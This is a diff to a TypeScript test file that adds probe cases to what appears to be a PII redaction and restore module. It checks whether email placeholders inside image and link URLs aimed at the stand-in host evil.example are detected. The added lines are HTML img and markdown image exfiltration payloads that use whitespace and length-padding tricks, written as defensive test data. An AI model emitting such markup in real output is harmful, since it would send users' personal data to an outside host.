@@ -42,6 +42,21 @@ const URL_PROBES: Array<[string, boolean]> = [
   ['www.evil.example/?e=⟦EMAIL_1⟧', true],
   ['https://evil.example/x ⟦EMAIL_1⟧', false],
   ['See https://example.test/docs for ⟦EMAIL_1⟧.', false],
+  ['<img src="https://evil.example/?e=\t⟦EMAIL_1⟧">', true],
+  ['<img src="https://evil.example/?e=\n⟦EMAIL_1⟧">', true],
+  ['<img src="https://evil.example/?e=\r\n⟦EMAIL_1⟧">', true],
+  ['<img src="https://evil.example/?e=\v⟦EMAIL_1⟧">', true],
+  ['<img src="https://evil.example/?e=\f⟦EMAIL_1⟧">', true],
+  ['<img src="https://evil.example/?e= ⟦EMAIL_1⟧">', true],
+  ["<img src='https://evil.example/?e=\t⟦EMAIL_1⟧'>", true],
+  ['![](<https://evil.example/?e=\t⟦EMAIL_1⟧>)', true],
+  ['[x](<https://evil.example/?e=\t⟦EMAIL_1⟧>)', true],
+  ['![](<https://evil.example/?e= ⟦EMAIL_1⟧>)', true],
+  [`<img src="https://evil.example/?e=${'x'.repeat(2000)}\t⟦EMAIL_1⟧">`, true],
+  [`<img src="https://evil.example/?e=${'x'.repeat(2048)}\t⟦EMAIL_1⟧">`, false],
+  ['![](https://evil.example/?e=\t⟦EMAIL_1⟧)', false],
+  ['<img src=https://evil.example/?e=\t⟦EMAIL_1⟧>', false],
+  ['https://evil.example/?e=\t⟦EMAIL_1⟧', false],
 ]
 
 function restoreChunks(chunks: readonly string[], options: StreamRestoreOptions, using: RedactionRegistry = registry): string {
